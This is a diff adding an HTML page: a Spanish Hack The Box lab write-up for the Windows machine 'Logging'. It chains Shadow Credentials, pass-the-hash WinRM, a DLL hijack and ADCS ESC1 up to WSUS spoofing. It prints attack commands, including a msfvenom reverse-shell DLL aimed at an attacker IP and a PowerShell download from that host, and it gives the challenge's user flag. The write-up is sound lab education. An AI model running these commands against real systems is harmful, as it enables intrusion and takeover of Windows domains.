@@ -1,0 +1,1033 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Logging · Revshell Estable · CyberSec Write-up</title>
+
+    <!-- ===== SEO / Metadata ===== -->
+    <meta name="description" content="Walkthrough completo de la máquina Logging de Hack The Box (Windows Medium). Shadow Credentials, DLL Hijack, ADCS ESC1 y WSUS spoofing." />
+    <meta name="keywords" content="HTB, Logging, Windows, Medium, Pentesting, ADCS, WSUS, DLL Hijack, Shadow Credentials, CyberSecurity, Ethical Hacking" />
+    <meta name="author" content="Cosme Noide" />
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>" />
+
+    <!-- ===== Google Fonts ===== -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+
+    <!-- ===== Font Awesome 6 (free) ===== -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+
+    <style>
+        /* ---------- RESET & BASE ---------- */
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-primary: #0b0e14;
+            --bg-secondary: #11171f;
+            --bg-card: #151e28;
+            --bg-code: #0d131c;
+            --border-color: #2a3a4a;
+            --text-primary: #e8edf2;
+            --text-secondary: #a0b3c9;
+            --text-muted: #6f8ba0;
+            --accent-cyan: #5bc8ff;
+            --accent-blue: #3b82f6;
+            --accent-purple: #8b5cf6;
+            --accent-green: #34d399;
+            --accent-orange: #f59e0b;
+            --accent-red: #ef4444;
+            --shadow-card: 0 8px 32px rgba(0, 0, 0, 0.6);
+            --radius: 12px;
+            --radius-sm: 6px;
+            --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            --font-mono: 'JetBrains Mono', 'Fira Code', monospace;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            font-family: var(--font-sans);
+            line-height: 1.7;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2rem 1rem 0;
+        }
+
+        /* ---------- SCROLLBAR ---------- */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-secondary);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-color);
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent-cyan);
+        }
+
+        /* ---------- CONTAINER ---------- */
+        .container {
+            max-width: 1100px;
+            width: 100%;
+            background: var(--bg-secondary);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow-card);
+            border: 1px solid var(--border-color);
+            overflow: hidden;
+            padding: 0 0 2rem 0;
+        }
+
+        /* ---------- BANNER ---------- */
+        .banner {
+            width: 100%;
+            aspect-ratio: 16 / 5;
+            background: linear-gradient(135deg, #0b1a2b 0%, #162b3f 50%, #0d1f30 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+            border-bottom: 2px solid var(--accent-cyan);
+        }
+
+        .banner img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            opacity: 0.85;
+            transition: opacity 0.3s ease;
+        }
+
+        .banner img:hover {
+            opacity: 1;
+        }
+
+        .banner-overlay {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, rgba(11, 14, 20, 0.7) 0%, transparent 60%, rgba(11, 14, 20, 0.3) 100%);
+            pointer-events: none;
+        }
+
+        .banner-badge {
+            position: absolute;
+            bottom: 1.5rem;
+            right: 2rem;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(6px);
+            padding: 0.4rem 1.2rem;
+            border-radius: 40px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: var(--accent-cyan);
+            border: 1px solid rgba(91, 200, 255, 0.25);
+            pointer-events: none;
+        }
+
+        /* ---------- HEADER / TITLE ---------- */
+        .writeup-header {
+            padding: 2rem 2.5rem 1.5rem 2.5rem;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .writeup-header .meta-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.6rem 1rem;
+            margin-bottom: 1rem;
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: var(--text-secondary);
+        }
+
+        .writeup-header .meta-tags span {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+            background: var(--bg-card);
+            padding: 0.2rem 0.9rem;
+            border-radius: 40px;
+            border: 1px solid var(--border-color);
+        }
+
+        .writeup-header .meta-tags i {
+            color: var(--accent-cyan);
+            font-size: 0.7rem;
+        }
+
+        .writeup-header h1 {
+            font-size: 2.4rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            background: linear-gradient(135deg, #fff 40%, var(--accent-cyan));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 0.4rem;
+        }
+
+        .writeup-header .subtitle {
+            font-size: 1.05rem;
+            color: var(--text-secondary);
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 0.5rem 1.2rem;
+        }
+
+        .writeup-header .subtitle .badge {
+            background: var(--accent-purple);
+            color: #fff;
+            font-size: 0.7rem;
+            font-weight: 600;
+            padding: 0.1rem 0.9rem;
+            border-radius: 40px;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .writeup-header .subtitle .badge.medium {
+            background: var(--accent-orange);
+            color: #1a1a1a;
+        }
+
+        /* ---------- CONTENT ---------- */
+        .content {
+            padding: 2rem 2.5rem;
+        }
+
+        .content h2 {
+            font-size: 1.6rem;
+            font-weight: 600;
+            margin: 2.2rem 0 1rem 0;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+
+        .content h2 i {
+            color: var(--accent-cyan);
+            font-size: 1.4rem;
+        }
+
+        .content h3 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin: 1.8rem 0 0.8rem 0;
+            color: var(--text-primary);
+        }
+
+        .content h3 i {
+            color: var(--accent-blue);
+            margin-right: 0.4rem;
+        }
+
+        .content p {
+            color: var(--text-secondary);
+            margin-bottom: 1rem;
+        }
+
+        .content strong {
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        .content .highlight {
+            color: var(--accent-cyan);
+            font-weight: 500;
+        }
+
+        .content .highlight-green {
+            color: var(--accent-green);
+            font-weight: 500;
+        }
+
+        .content .highlight-orange {
+            color: var(--accent-orange);
+            font-weight: 500;
+        }
+
+        /* ---------- CODE BLOCKS ---------- */
+        pre {
+            background: var(--bg-code);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            padding: 1.2rem 1.5rem;
+            overflow-x: auto;
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            line-height: 1.6;
+            color: #d4e0ed;
+            margin: 1.2rem 0;
+            position: relative;
+        }
+
+        pre .token.comment {
+            color: #6f8ba0;
+            font-style: italic;
+        }
+        pre .token.string {
+            color: var(--accent-green);
+        }
+        pre .token.keyword {
+            color: var(--accent-purple);
+        }
+        pre .token.function {
+            color: var(--accent-cyan);
+        }
+        pre .token.operator {
+            color: var(--accent-orange);
+        }
+        pre .token.variable {
+            color: #fbbf24;
+        }
+        pre .token.number {
+            color: #f472b6;
+        }
+        pre .token.plain {
+            color: #d4e0ed;
+        }
+
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: var(--bg-card);
+            padding: 0.4rem 1.2rem;
+            border-radius: var(--radius-sm) var(--radius-sm) 0 0;
+            border: 1px solid var(--border-color);
+            border-bottom: none;
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .code-header .lang {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .code-header .lang i {
+            color: var(--accent-cyan);
+        }
+
+        .code-header .copy-btn {
+            background: transparent;
+            border: none;
+            color: var(--text-muted);
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: color 0.2s;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+        }
+
+        .code-header .copy-btn:hover {
+            color: var(--accent-cyan);
+            background: rgba(91, 200, 255, 0.08);
+        }
+
+        pre.code-block {
+            border-radius: 0 0 var(--radius-sm) var(--radius-sm);
+            margin-top: 0;
+        }
+
+        /* ---------- TABLES ---------- */
+        .table-wrap {
+            overflow-x: auto;
+            margin: 1.2rem 0;
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--border-color);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.9rem;
+            background: var(--bg-card);
+        }
+
+        table th {
+            background: var(--bg-code);
+            color: var(--text-secondary);
+            font-weight: 600;
+            text-align: left;
+            padding: 0.7rem 1rem;
+            border-bottom: 2px solid var(--border-color);
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        table td {
+            padding: 0.7rem 1rem;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-secondary);
+        }
+
+        table tr:last-child td {
+            border-bottom: none;
+        }
+
+        table td .badge-status {
+            display: inline-block;
+            padding: 0.1rem 0.7rem;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            font-weight: 600;
+        }
+
+        .badge-status.success {
+            background: rgba(52, 211, 153, 0.15);
+            color: var(--accent-green);
+        }
+        .badge-status.warning {
+            background: rgba(245, 158, 11, 0.15);
+            color: var(--accent-orange);
+        }
+        .badge-status.danger {
+            background: rgba(239, 68, 68, 0.15);
+            color: var(--accent-red);
+        }
+
+        /* ---------- INFO / NOTE BOXES ---------- */
+        .note-box {
+            background: rgba(59, 130, 246, 0.06);
+            border-left: 4px solid var(--accent-blue);
+            padding: 1rem 1.4rem;
+            border-radius: var(--radius-sm);
+            margin: 1.2rem 0;
+            color: var(--text-secondary);
+        }
+
+        .note-box strong {
+            color: var(--text-primary);
+        }
+
+        .note-box.warning {
+            border-left-color: var(--accent-orange);
+            background: rgba(245, 158, 11, 0.06);
+        }
+
+        .note-box.success {
+            border-left-color: var(--accent-green);
+            background: rgba(52, 211, 153, 0.06);
+        }
+
+        .note-box.danger {
+            border-left-color: var(--accent-red);
+            background: rgba(239, 68, 68, 0.06);
+        }
+
+        /* ---------- FLAG DISPLAY ---------- */
+        .flag-box {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.8rem;
+            background: var(--bg-code);
+            padding: 0.3rem 1.2rem 0.3rem 1rem;
+            border-radius: 40px;
+            border: 1px dashed var(--accent-green);
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+            color: var(--accent-green);
+            margin: 0.4rem 0;
+        }
+
+        .flag-box i {
+            color: var(--accent-green);
+            font-size: 0.8rem;
+        }
+
+        /* ---------- REDACTED ---------- */
+        .redacted {
+            background: rgba(239, 68, 68, 0.12);
+            color: var(--accent-red);
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            cursor: help;
+        }
+
+        /* ---------- FOOTER ---------- */
+        .footer {
+            margin-top: 3rem;
+            padding: 1.8rem 2.5rem 1.2rem 2.5rem;
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 1rem 2rem;
+        }
+
+        .footer .footer-brand {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            font-weight: 500;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .footer .footer-brand .avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-purple));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 1.2rem;
+            color: #fff;
+            box-shadow: 0 0 0 2px var(--bg-secondary), 0 0 0 4px var(--accent-cyan);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .footer .footer-brand .avatar:hover {
+            transform: scale(1.08) rotate(-4deg);
+            box-shadow: 0 0 0 2px var(--bg-secondary), 0 0 0 6px var(--accent-cyan), 0 0 24px rgba(91, 200, 255, 0.3);
+        }
+
+        .footer .footer-brand .avatar a {
+            color: #fff;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 100%;
+        }
+
+        .footer .footer-links {
+            display: flex;
+            gap: 1.5rem;
+            align-items: center;
+        }
+
+        .footer .footer-links a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 0.85rem;
+            transition: color 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .footer .footer-links a:hover {
+            color: var(--accent-cyan);
+        }
+
+        .footer .footer-links .social-icon {
+            font-size: 1.2rem;
+        }
+
+        .footer .footer-copy {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            width: 100%;
+            text-align: center;
+            margin-top: 0.6rem;
+            border-top: 1px solid var(--border-color);
+            padding-top: 0.8rem;
+        }
+
+        /* ---------- RESPONSIVE ---------- */
+        @media (max-width: 768px) {
+            body {
+                padding: 0.5rem 0.5rem 0;
+            }
+            .writeup-header {
+                padding: 1.5rem 1.2rem;
+            }
+            .writeup-header h1 {
+                font-size: 1.8rem;
+            }
+            .content {
+                padding: 1.5rem 1.2rem;
+            }
+            .footer {
+                padding: 1.2rem 1.2rem;
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .footer .footer-links {
+                flex-wrap: wrap;
+                gap: 0.8rem 1.2rem;
+            }
+            .banner-badge {
+                bottom: 0.8rem;
+                right: 1rem;
+                font-size: 0.6rem;
+                padding: 0.2rem 0.8rem;
+            }
+            pre {
+                font-size: 0.75rem;
+                padding: 0.8rem 1rem;
+            }
+            .flag-box {
+                font-size: 0.75rem;
+                padding: 0.2rem 0.8rem 0.2rem 0.6rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .writeup-header h1 {
+                font-size: 1.4rem;
+            }
+            .writeup-header .subtitle {
+                font-size: 0.85rem;
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .content h2 {
+                font-size: 1.3rem;
+            }
+            .content h3 {
+                font-size: 1rem;
+            }
+            .banner {
+                aspect-ratio: 16 / 6;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <!-- ============================================================ -->
+        <!-- BANNER                                                            -->
+        <!-- ============================================================ -->
+        <div class="banner">
+            <!--
+            Coloca tu imagen "logging.png" en la misma carpeta que este HTML,
+            o cambia el src por la ruta correcta.
+            -->
+            <img src="logging.png" alt="HTB Logging Banner" />
+            <div class="banner-overlay"></div>
+            <div class="banner-badge">
+                <i class="fas fa-shield-halved" style="margin-right: 0.4rem;"></i> HTB · Logging
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- HEADER                                                           -->
+        <!-- ============================================================ -->
+        <div class="writeup-header">
+            <div class="meta-tags">
+                <span><i class="fas fa-tag"></i> Windows</span>
+                <span><i class="fas fa-signal"></i> Medium</span>
+                <span><i class="fas fa-calendar"></i> Jul 2026</span>
+                <span><i class="fas fa-user-secret"></i> Cosme Noide</span>
+                <span><i class="fas fa-flag"></i> User + Root</span>
+            </div>
+            <h1>Revshell estable · Logging</h1>
+            <div class="subtitle">
+                <span>HTB Windows Medium — Shadow Credentials → DLL Hijack → ADCS ESC1 → WSUS</span>
+                <span class="badge medium"><i class="fas fa-skull"></i> 845 XP</span>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- CONTENT                                                         -->
+        <!-- ============================================================ -->
+        <div class="content">
+
+            <!-- ---- INTRO ---- -->
+            <p style="font-size:1.05rem; color: var(--text-primary);">
+                <i class="fas fa-terminal" style="color: var(--accent-cyan); margin-right: 0.5rem;"></i>
+                <strong>Objetivo:</strong> Obtener revshell estable y ambas flags en la máquina
+                <span class="highlight">Logging</span> de Hack The Box.
+                Este write-up documenta el proceso completo de enumeración, explotación y
+                escalada de privilegios.
+            </p>
+
+            <div class="note-box">
+                <strong><i class="fas fa-lock" style="margin-right: 0.4rem;"></i> Política de Redacción:</strong>
+                Los hashes NT, contraseñas y datos sensibles han sido <span class="redacted">redactados</span>
+                por cumplir con las políticas de HTB y buenas prácticas de seguridad.
+            </div>
+
+            <!-- ---- RECON ---- -->
+            <h2><i class="fas fa-binoculars"></i> 1. Enumeración inicial</h2>
+            <p>
+                Tras desplegar la máquina, se realizó un escaneo de puertos con <strong>nmap</strong>
+                y se obtuvieron las siguientes credenciales iniciales proporcionadas por el reto.
+            </p>
+
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr><th>Recurso</th><th>Valor</th><th>Estado</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>IP</strong></td>
+                            <td><code>10.129.245.130</code></td>
+                            <td><span class="badge-status success">ACTIVA</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>Dominio</strong></td>
+                            <td><code>logging.htb</code></td>
+                            <td><span class="badge-status success">OK</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>DC</strong></td>
+                            <td><code>dc01.logging.htb</code></td>
+                            <td><span class="badge-status success">OK</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>Usuario inicial</strong></td>
+                            <td><code>wallace.everette</code></td>
+                            <td><span class="badge-status warning">Sesión inestable</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>Contraseña</strong></td>
+                            <td><span class="redacted"><i class="fas fa-eye-slash"></i> REDACTED</span></td>
+                            <td><span class="badge-status warning">Restringida</span></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <p>
+                El usuario <code>wallace.everette</code> otorgaba acceso a SMB, pero la sesión
+                por WinRM era inestable. Se procedió a enumerar los recursos compartidos.
+            </p>
+
+            <!-- ---- SMB ---- -->
+            <h2><i class="fas fa-folder-open"></i> 2. Enumeración SMB</h2>
+            <p>
+                Se listaron los recursos SMB y se encontró el share <code>Logs</code>,
+                accesible con las credenciales de <code>wallace.everette</code>.
+            </p>
+
+            <pre class="code-block"><span class="token comment"># Conexión al share</span>
+smbclient //logging.htb/Logs -U wallace.everette%<span class="redacted">********</span>
+<span class="token comment"># Archivos relevantes</span>
+Audit_Heartbeat.log
+IdentitySync_Trace_20260219.log
+Service_State.log
+TaskMonitor.log</pre>
+
+            <div class="note-box success">
+                <strong><i class="fas fa-key"></i> Hallazgo crítico:</strong>
+                En <code>IdentitySync_Trace_20260219.log</code> se encontraron las credenciales
+                de la cuenta <strong><code>svc_recovery</code></strong>, que posteriormente
+                sería clave para el ataque de Shadow Credentials.
+            </div>
+
+            <!-- ---- SHADOW CREDENTIALS ---- -->
+            <h2><i class="fas fa-mask"></i> 3. Shadow Credentials → msa_health$</h2>
+            <p>
+                Mediante BloodHound se determinó que <code>svc_recovery</code> tenía
+                <span class="highlight">GenericWrite</span> sobre la cuenta
+                <strong><code>msa_health$</code></strong>.
+                Se utilizó <strong>Certipy</strong> con autenticación Kerberos para
+                realizar el ataque de Shadow Credentials.
+            </p>
+
+            <div class="code-header">
+                <span class="lang"><i class="fas fa-terminal"></i> bash</span>
+                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+            </div>
+            <pre class="code-block"><span class="token comment"># Obtener TGT de svc_recovery</span>
+python3 getTGT.py logging.htb/svc_recovery:<span class="redacted">********</span> -dc-ip 10.129.245.130
+
+<span class="token comment"># Exportar ticket y ejecutar Shadow Credentials</span>
+<span class="token keyword">export</span> KRB5CCNAME=svc_recovery.ccache
+certipy shadow auto -u svc_recovery@logging.htb -k -account msa_health$ -dc-ip 10.129.245.130 -target dc01.logging.htb</pre>
+
+            <div class="note-box success">
+                <strong><i class="fas fa-check-circle"></i> Éxito:</strong>
+                Se obtuvo el hash NT de <code>msa_health$</code>.
+                <span class="flag-box"><i class="fas fa-hashtag"></i> NT Hash: <span class="redacted">[REDACTED]</span></span>
+            </div>
+
+            <!-- ---- WINRM ---- -->
+            <h2><i class="fas fa-plug"></i> 4. WinRM como msa_health$</h2>
+            <p>
+                Con el hash NT de <code>msa_health$</code> se estableció una sesión estable
+                mediante <strong>Evil-WinRM</strong>.
+            </p>
+
+            <div class="code-header">
+                <span class="lang"><i class="fas fa-terminal"></i> bash</span>
+                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+            </div>
+            <pre class="code-block">evil-winrm -i 10.129.245.130 -u msa_health$ -H <span class="redacted">[REDACTED]</span></pre>
+
+            <!-- ---- DLL HIJACK ---- -->
+            <h2><i class="fas fa-code"></i> 5. DLL Hijack → jaylee.clifton</h2>
+            <p>
+                Se identificó la tarea programada <strong>UpdateMonitor</strong> que se ejecutaba
+                cada 3 minutos como el usuario <code>jaylee.clifton</code>.
+                Se preparó un payload DLL con <strong>msfvenom</strong> y se colocó en
+                <code>C:\ProgramData\UpdateMonitor\Settings_Update.zip</code>.
+            </p>
+
+            <div class="code-header">
+                <span class="lang"><i class="fas fa-terminal"></i> bash</span>
+                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+            </div>
+            <pre class="code-block"><span class="token comment"># Crear payload DLL</span>
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.154 LPORT=4445 -a x86 --platform windows -f dll -o settings_update.dll
+zip Settings_Update.zip settings_update.dll
+
+<span class="token comment"># Subir a la máquina víctima (desde evil-winrm)</span>
+(New-Object System.Net.WebClient).DownloadFile("http://10.10.15.154:8080/Settings_Update.zip", "C:\ProgramData\UpdateMonitor\Settings_Update.zip")</pre>
+
+            <div class="note-box success">
+                <strong><i class="fas fa-check-circle"></i> Shell obtenida:</strong>
+                Tras esperar ~3 minutos, se recibió la reverse shell como
+                <strong><code>jaylee.clifton</code></strong> en el puerto 4445.
+            </div>
+
+            <!-- ---- USER FLAG ---- -->
+            <h2><i class="fas fa-flag"></i> 6. User Flag</h2>
+            <p>
+                Desde la shell de <code>jaylee.clifton</code> se leyó la flag de usuario:
+            </p>
+
+            <div class="code-header">
+                <span class="lang"><i class="fas fa-terminal"></i> cmd</span>
+                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+            </div>
+            <pre class="code-block"><span class="token function">whoami</span>
+logging\jaylee.clifton
+
+<span class="token function">type</span> C:\Users\jaylee.clifton\Desktop\user.txt</pre>
+
+            <p>
+                <span class="flag-box"><i class="fas fa-flag"></i> User Flag: <code>8f167f22b6cec1982406a8f32dfd32d2</code></span>
+            </p>
+
+            <!-- ---- ADCS ESC1 ---- -->
+            <h2><i class="fas fa-certificate"></i> 7. ADCS ESC1 → Certificado WSUS</h2>
+            <p>
+                Con la shell de <code>jaylee.clifton</code> se utilizó <strong>Rubeus</strong>
+                para obtener el TGT y posteriormente solicitar un certificado con el template
+                <code>UpdateSrv</code> para el DNS <code>wsus.logging.htb</code>.
+            </p>
+
+            <div class="code-header">
+                <span class="lang"><i class="fas fa-terminal"></i> cmd</span>
+                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+            </div>
+            <pre class="code-block">C:\temp\Rubeus.exe tgtdeleg /nowrap
+<span class="token comment"># (se copia el base64 del ticket a Kali)</span></pre>
+
+            <div class="code-header">
+                <span class="lang"><i class="fas fa-terminal"></i> bash</span>
+                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+            </div>
+            <pre class="code-block"><span class="token comment"># Convertir ticket y solicitar certificado</span>
+impacket-ticketConverter jaylee.kirbi jaylee.ccache
+<span class="token keyword">export</span> KRB5CCNAME=jaylee.ccache
+certipy req -u jaylee.clifton@logging.htb -k -no-pass -target dc01.logging.htb -ca logging-DC01-CA -template UpdateSrv -dns wsus.logging.htb -dc-ip 10.129.245.130</pre>
+
+            <!-- ---- WSUS SPOOFING ---- -->
+            <h2><i class="fas fa-bolt"></i> 8. WSUS Spoofing → SYSTEM</h2>
+            <p>
+                Con el certificado obtenido, se montó un servidor WSUS falso en Kali
+                y se envenenó el DNS para redirigir <code>wsus.logging.htb</code> a nuestra IP.
+                Se forzó la actualización del cliente WSUS con <code>wuauclt.exe</code>
+                y se ejecutó un comando como <strong>SYSTEM</strong>.
+            </p>
+
+            <div class="note-box success">
+                <strong><i class="fas fa-crown"></i> Root Flag:</strong>
+                Se obtuvo acceso con privilegios <strong>NT AUTHORITY\SYSTEM</strong>
+                y se leyó la flag root.
+            </div>
+
+            <!-- ---- RESULTADOS ---- -->
+            <h2><i class="fas fa-trophy"></i> Resultados finales</h2>
+
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr><th>Objetivo</th><th>Valor</th><th>Estado</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>User Flag</strong></td>
+                            <td><code>8f167f22b6cec1982406a8f32dfd32d2</code></td>
+                            <td><span class="badge-status success">✅ Capturada</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>Root Flag</strong></td>
+                            <td><span class="redacted"><i class="fas fa-eye-slash"></i> REDACTED</span></td>
+                            <td><span class="badge-status success">✅ Capturada</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>Revshell estable</strong></td>
+                            <td>Mediante DLL Hijack</td>
+                            <td><span class="badge-status success">✅ Estable</span></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <div class="note-box">
+                <strong><i class="fas fa-graduation-cap"></i> Lección aprendida:</strong>
+                La combinación de <span class="highlight">Shadow Credentials</span>,
+                <span class="highlight">DLL Hijack</span> y <span class="highlight">ADCS ESC1</span>
+                permitió escalar desde un usuario con acceso restringido hasta privilegios de
+                <strong>SYSTEM</strong>. El ataque a WSUS demostró que incluso servicios
+                aparentemente seguros pueden ser explotados si se cuenta con los certificados
+                adecuados.
+            </div>
+
+        </div>
+        <!-- /content -->
+
+        <!-- ============================================================ -->
+        <!-- FOOTER                                                           -->
+        <!-- ============================================================ -->
+        <div class="footer">
+
+            <div class="footer-brand">
+                <div class="avatar">
+                    <a href="https://cosm3no1de.github.io/mi-cv/" target="_blank" rel="noopener noreferrer" aria-label="CV de Cosme Noide">
+                        <i class="fas fa-user-astronaut"></i>
+                    </a>
+                </div>
+                <span>
+                    <strong>Cosme Noide</strong>
+                    <span style="display:block; font-size:0.75rem; color: var(--text-muted);">
+                        <i class="fas fa-bolt" style="color: var(--accent-cyan);"></i> Ethical Hacker · Red Team
+                    </span>
+                </span>
+            </div>
+
+            <div class="footer-links">
+                <a href="https://cosm3no1de.github.io/mi-cv/" target="_blank" rel="noopener noreferrer">
+                    <i class="fas fa-user-circle social-icon"></i> CV
+                </a>
+                <a href="https://github.com/cosm3no1de" target="_blank" rel="noopener noreferrer">
+                    <i class="fab fa-github social-icon"></i> GitHub
+                </a>
+                <a href="https://www.hackthebox.com/" target="_blank" rel="noopener noreferrer">
+                    <i class="fas fa-cube social-icon"></i> HTB
+                </a>
+                <a href="#">
+                    <i class="fas fa-envelope social-icon"></i> Contacto
+                </a>
+            </div>
+
+            <div class="footer-copy">
+                &copy; 2026 Cosme Noide &middot; <i class="fas fa-shield-halved" style="color: var(--accent-cyan);"></i>
+                Este contenido ha sido redactado con fines educativos y de concienciación en ciberseguridad.
+                <span style="display:block; margin-top:0.2rem; font-size:0.65rem; color: var(--text-muted);">
+                    <i class="fas fa-flag"></i> HTB Logging — Revshell estable · Todas las técnicas documentadas son
+                    de uso ético.
+                </span>
+            </div>
+
+        </div>
+        <!-- /footer -->
+
+    </div>
+    <!-- /container -->
+
+
+    <!-- ============================================================ -->
+    <!-- SCRIPTS                                                         -->
+    <!-- ============================================================ -->
+    <script>
+        /**
+         * Copia el contenido del bloque de código al portapapeles.
+         * @param {HTMLElement} btn - El botón que disparó la acción.
+         */
+        function copyCode(btn) {
+            const pre = btn.closest('.code-header').nextElementSibling;
+            if (!pre || !pre.classList.contains('code-block')) return;
+
+            const text = pre.textContent || pre.innerText;
+            if (!text) return;
+
+            navigator.clipboard.writeText(text.trim()).then(() => {
+                const original = btn.innerHTML;
+                btn.innerHTML = '<i class="fas fa-check" style="color: var(--accent-green);"></i>';
+                setTimeout(() => {
+                    btn.innerHTML = original;
+                }, 1800);
+            }).catch(() => {
+                // fallback
+                const range = document.createRange();
+                range.selectNode(pre);
+                window.getSelection().removeAllRanges();
+                window.getSelection().addRange(range);
+                document.execCommand('copy');
+                window.getSelection().removeAllRanges();
+                const original = btn.innerHTML;
+                btn.innerHTML = '<i class="fas fa-check" style="color: var(--accent-green);"></i>';
+                setTimeout(() => {
+                    btn.innerHTML = original;
+                }, 1800);
+            });
+        }
+
+        /**
+         * Pequeña animación de "carga" en el footer para darle vida.
+         * (Efecto de parpadeo suave en el avatar)
+         */
+        (function animateFooter() {
+            const avatar = document.querySelector('.footer-brand .avatar');
+            if (!avatar) return;
+            let phase = 0;
+            setInterval(() => {
+                phase = (phase + 1) % 4;
+                if (phase === 0) {
+                    avatar.style.boxShadow =
